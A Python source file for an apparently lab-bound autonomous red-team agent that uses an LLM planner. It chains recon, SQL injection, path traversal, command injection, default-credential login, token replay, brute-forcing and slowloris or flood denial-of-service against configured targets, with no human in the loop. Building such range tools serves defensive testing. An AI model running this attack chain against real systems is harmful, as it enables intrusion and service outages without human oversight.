"""Shadow-Strike v2: autonomous red-team agent.

Hacker-mind loop: recon -> gap analysis -> multi-step plan -> execute chain ->
telemetry -> advance phase -> rotate for novelty. No human in the loop.
Gemini via ai_brain when a key is present, deterministic rule planner offline.
"""
import asyncio
import json
import logging
import sys
import time
import urllib.parse
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
import ai_brain
import config
import red_tools as tools
from http_client import HttpClient, CircuitBreakerOpen

logger = logging.getLogger("shadow.red")

IDENTITY = "red.agent"
SELF_IP = config.RED_IP
ORCH = config.ORCH
TARGETS = {"blue": config.BLUE, "honey": config.HONEY}

backoff = {"level": 0}
tried = set()
last_token = None
chain_no = 0
http_client: HttpClient = None


async def post(etype, data):
    if http_client is None:
        return
    try:
        await http_client.post("/api/v1/telemetry",
                               json_data={"type": etype, "source": IDENTITY, "data": data})
    except CircuitBreakerOpen:
        logger.warning(f"CB open dropping type={etype}")
    except Exception as e:
        logger.warning(f"telemetry failed type={etype} error={e}")


async def status():
    if http_client is None:
        return {}
    try:
        return await http_client.get("/api/v1/status")
    except Exception:
        return {}


def red_prompt_creds():
    import red_prompt
    return red_prompt.DEFAULT_CREDS


async def recon():
    """Full intelligence pass. Returns structured findings for the AI."""
    findings = {"ports": await tools.probe_ports(TARGETS)}
    web = await tools.probe_web(config.BLUE["host"], config.BLUE["port"], SELF_IP)
    auth = await tools.probe_auth(config.BLUE["host"], config.BLUE["port"],
                                  SELF_IP, red_prompt_creds())
    stress = await tools.stress(config.BLUE["host"], config.BLUE["port"], SELF_IP,
                                concurrency=config.RECON_STRESS_CONCURRENCY,
                                duration=config.RECON_STRESS_DURATION)
    findings["web"] = web
    findings["auth"] = auth
    findings["stress"] = stress
    findings["vulns"] = ai_brain.classify_vulns(web, auth, stress)
    return findings


async def _run_action(action, params, target):
    """Execute one step. Returns dict with ok/status + optional captures."""
    global last_token
    host = target["host"]
    port = int(target["port"])
    label = f"{target['ip']}:{port}"

    if action == "probe":
        res = await tools.http_get(host, port, "/", agent_ip=SELF_IP)
        await post("attack.payload", {"action": "probe", "target": label,
                                "status": res["status"],
                                "server": res["headers"].get("server", "")})
        return {"ok": res["status"] in (200, 403), "status": res["status"]}

    if action == "sqli":
        path = params.get("path", "/api/users")
        body = params.get("body", "'")
        res = await tools.http_get(host, port,
                                   f"{path}?id={urllib.parse.quote(body)}",
                                   agent_ip=SELF_IP)
        await post("attack.payload", {"action": "sqli", "target": label,
                                "payload": body, "status": res["status"],
                                "response": res["body"][:120]})
        return {"ok": res["status"] in (200, 500), "status": res["status"]}

    if action == "traversal":
        path = params.get("path", "/static/../config.json")
        res = await tools.http_get(host, port, path, agent_ip=SELF_IP)
        await post("attack.payload", {"action": "traversal", "target": label,
                                "path": path, "status": res["status"],
                                "response": res["body"][:120]})
        return {"ok": res["status"] == 200, "status": res["status"]}

    if action == "encoded_traversal":
        out = await tools.encoded_traversal(host, port, SELF_IP,
                                            params.get("variants"))
        await post("attack.payload", {"action": "encoded_traversal", "target": label,
                                "tried": out["tried"], "leaked": out["leaked"],
                                "leaks": list(out["results"].keys())[:5]})
        return {"ok": out["leaked"] > 0, "leaked": out["leaked"],
                "status": 200 if out["leaked"] else 403}

    if action == "cmd_inject":
        out = await tools.cmd_inject(host, port, SELF_IP, params.get("payloads"))
        await post("attack.payload", {"action": "cmd_inject", "target": label,
                                "tried": out["tried"], "hits": out["hits"],
                                "echoes": [r["echo"] for r in out["results"]
                                           if r["hit"]][:3]})
        return {"ok": out["hits"] > 0, "hits": out["hits"],
                "status": 200 if out["hits"] else 403}

    if action == "auth":
        user = params.get("user", "admin")
        pwd = params.get("password", "admin")
        res = await tools.http_post_json(host, port, "/api/auth/login",
                                         {"user": user, "password": pwd},
                                         agent_ip=SELF_IP)
        admin_status = None
        token = None
        if res["status"] == 200:
            cookie = res["headers"].get("set-cookie", "").split(";")[0]
            token = cookie.split("=")[-1] if "=" in cookie else cookie
            last_token = token
            adm = await tools.http_get(host, port, "/admin",
                                       extra_headers={"Cookie": cookie},
                                       agent_ip=SELF_IP)
            admin_status = adm["status"]
        await post("attack.payload", {"action": "auth", "target": label,
                                "creds": f"{user}:{pwd}",
                                "login": res["status"], "admin": admin_status})
        return {"ok": res["status"] == 200, "login": res["status"],
                "admin": admin_status, "token": token}

    if action == "token_replay":
        token = params.get("token") or last_token or "tok-"
        res = await tools.http_get(host, port, "/admin",
                                   extra_headers={"Cookie": f"sw_session={token}"},
                                   agent_ip=SELF_IP)
        await post("attack.payload", {"action": "token_replay", "target": label,
                                "token": token[:24], "status": res["status"]})
        return {"ok": res["status"] == 200, "status": res["status"]}

    if action in ("dir_brute",):
        out = await tools.dir_brute(host, port, SELF_IP, params.get("paths"))
        await post("attack.payload", {"action": "dir_brute", "target": label,
                                "hits": out["hits"],
                                "found": list(out["found"].keys())[:8]})
        return {"ok": out["hits"] > 0, "hits": out["hits"],
                "status": 200 if out["hits"] else 404}

    if action == "backup_hunt":
        out = await tools.backup_hunt(host, port, SELF_IP, params.get("paths"))
        await post("attack.payload", {"action": "backup_hunt", "target": label,
                                "exposed": out["exposed"],
                                "files": list(out["files"].keys())[:5]})
        return {"ok": out["exposed"] > 0, "exposed": out["exposed"],
                "status": 200 if out["exposed"] else 404}

    if action == "slowloris":
        out = await tools.slowloris(host, port, SELF_IP,
                                    sockets=int(params.get("sockets", 12)),
                                    duration=float(params.get("duration", 3)))
        await post("attack.payload", {"action": "slowloris", "target": label,
                                "opened": out["opened"],
                                "held": out["held_open"]})
        return {"ok": out["held_open"] >= 4, "held": out["held_open"],
                "status": 200}

    if action == "large_payload":
        out = await tools.large_payload(host, port, SELF_IP,
                                        size=int(params.get("size", 200000)))
        await post("attack.payload", {"action": "large_payload", "target": label,
                                "size": out["size"], "status": out["status"]})
        return {"ok": out["status"] not in (0,), "status": out["status"]}

    if action in ("header_fuzz", "payload"):
        path = params.get("path", "/")
        headers = params.get("headers", {"X-Test": "'"})
        res = await tools.http_get(host, port, path, extra_headers=headers,
                                   agent_ip=SELF_IP)
        await post("attack.payload", {"action": action, "target": label,
                                "headers": headers, "status": res["status"]})
        return {"ok": res["status"] in (400, 500), "status": res["status"]}

    if action == "flood":
        conc = max(1, min(int(params.get("concurrency", 20)),
                          config.MAX_CONCURRENCY))
        dur = max(1, min(float(params.get("duration", 4)), 10))
        res = await tools.stress(host, port, SELF_IP, concurrency=conc,
                                 duration=dur)
        await post("attack.payload", {"action": "flood", "target": label,
                                "concurrency": conc, "duration": dur,
                                "distribution": res["distribution"]})
        return {"ok": True, "pressure": res}

    if action == "tunnel":
        cmds = (params.get("commands") or [])[:config.DECOY_MAX_COMMANDS]
        frames = await tools.tunnel(host, port, SELF_IP, cmds)
        await post("attack.payload", {"action": "tunnel", "target": label,
                                "commands": len(cmds), "frames": len(frames)})
        return {"ok": True, "frames": len(frames)}

    if action in ("backoff", "report"):
        return {"ok": True, "action": action}

    return {"ok": True, "action": action}


async def execute(plan):
    """Execute a multi-step plan. Returns per-step results + summary."""
    results = []
    blocked = 0
    ok = 0
    for i, step in enumerate(plan.get("steps", []), start=1):
        r = await _run_action(step["action"], step["params"], step["target"])
        results.append({**step, "result": r})
        if r.get("status") == 403:
            blocked += 1
        if r.get("ok"):
            ok += 1
        await asyncio.sleep(0.2)
    await post("attack.plan", {
        "goal": plan.get("goal", ""),
        "gap": plan.get("gap", ""),
        "technique": plan.get("technique", ""),
        "steps": len(results),
        "steps_ok": ok,
        "steps_blocked": blocked,
        "expected": plan.get("expected", ""),
        "chain": chain_no,
    })
    return {"results": results, "ok": ok, "blocked": blocked,
            "total": len(results)}


async def main():
    global chain_no, http_client
    http_client = HttpClient(
        ORCH,
        max_connections=config.HTTP_MAX_CONNECTIONS,
        max_keepalive=config.HTTP_MAX_KEEPALIVE,
        timeout_total=config.HTTP_TIMEOUT_TOTAL,
        timeout_connect=config.HTTP_TIMEOUT_CONNECT,
        retry_attempts=config.HTTP_RETRY_ATTEMPTS,
        retry_backoff=config.HTTP_RETRY_BACKOFF,
        circuit_failure_threshold=config.CIRCUIT_FAILURE_THRESHOLD,
        circuit_recovery_timeout=config.CIRCUIT_RECOVERY_TIMEOUT,
    )
    await http_client.__aenter__()
    await post("system.heartbeat", {"agent": "red.agent", "ip": SELF_IP, "status": "online"})
    print("Shadow-Strike v2 online - hacker-mind kill-chain engine awaiting mission")
    history = []
    phase_idx = 0
    exploit_n = 0
    await post("attack.phase", {"phase": config.PHASES[0], "chain": chain_no})

    while True:
        st = await status()
        if st.get("attack", {}).get("active"):
            if backoff["level"] > 0:
                wait = min(config.BACKOFF_BASE * (2 ** backoff["level"]),
                           config.BACKOFF_MAX)
                await asyncio.sleep(wait)

            phase = config.PHASES[phase_idx]
            findings = await recon()
            await post("attack.recon", {
                "phase": phase,
                "ports": findings["ports"],
                "endpoints": findings["web"].get("endpoints", {}),
                "version": findings["web"].get("version", ""),
                "hidden": findings["web"].get("hidden_dirs", {}),
                "backups": findings["web"].get("backup_exposed", {}),
                "sqli": bool(findings["web"].get("sqli")),
                "traversal": bool(findings["web"].get("traversal")),
                "cmd_inject": bool(findings["web"].get("cmd_inject")),
                "auth": findings["auth"],
                "stress": findings["stress"],
            })

            plan = ai_brain.plan_mission(findings, history, phase, exploit_n,
                                         tried)
            technique = plan.get("technique", "?")
            await post("attack.decision", {
                "phase": phase,
                "goal": plan.get("goal", ""),
                "gap": plan.get("gap", ""),
                "technique": technique,
                "steps": [s["action"] for s in plan.get("steps", [])],
                "rationale": plan.get("rationale", ""),
                "expected": plan.get("expected", ""),
            })

            result = await execute(plan)
            tried.add(technique)
            tried.update(s["action"] for s in plan.get("steps", []))
            history.append({"phase": phase, "technique": technique,
                            "steps": result["total"], "ok": result["ok"],
                            "blocked": result["blocked"]})
            history = history[-8:]

            # defense-aware adaptation: all steps stonewalled -> speed up rotation
            if result["total"] and result["blocked"] >= result["total"]:
                await post("attack.adapt", {"reason": "defense engaged on all steps",
                                      "technique": technique,
                                      "tried_count": len(tried)})

            pressure = None
            for s in result.get("results", []):
                if isinstance(s.get("result"), dict):
                    p = s["result"].get("pressure")
                    if p:
                        pressure = p
            if pressure and pressure.get("error_rate", 0) > config.BACKOFF_THRESHOLD:
                backoff["level"] = min(backoff["level"] + 1, 6)
                await post("attack.backoff", {"reason": "target degraded/unresponsive",
                                        "level": backoff["level"],
                                        "error_rate": pressure.get("error_rate")})
            else:
                backoff["level"] = max(0, backoff["level"] - 1)

            if phase == "recon":
                if findings.get("vulns"):
                    phase_idx = 1
            elif phase == "exploit":
                exploit_n += 1
                if exploit_n >= 3 or not findings.get("vulns"):
                    phase_idx = 2
                    exploit_n = 0
            elif phase == "post-exploit":
                phase_idx = 3
            elif phase == "exfil":
                chain_no += 1
                phase_idx = 0
                await post("attack.metric",
                     {"note": f"kill-chain complete - cycle {chain_no}",
                      "tried_techniques": len(tried)})
            await post("attack.phase", {"phase": config.PHASES[phase_idx],
                                  "chain": chain_no})
        else:
            phase_idx = 0
            exploit_n = 0
            backoff["level"] = 0
        await asyncio.sleep(2)


if __name__ == "__main__":
    asyncio.run(main())